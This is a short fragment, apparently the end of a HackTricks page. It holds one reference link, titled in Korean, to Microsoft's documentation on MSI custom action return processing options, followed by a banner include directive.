- [16] [Microsoft Learn - 사용자 지정 작업 반환 처리 옵션](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-return-processing-options)
{{#include ../../banners/hacktricks-training.md}}
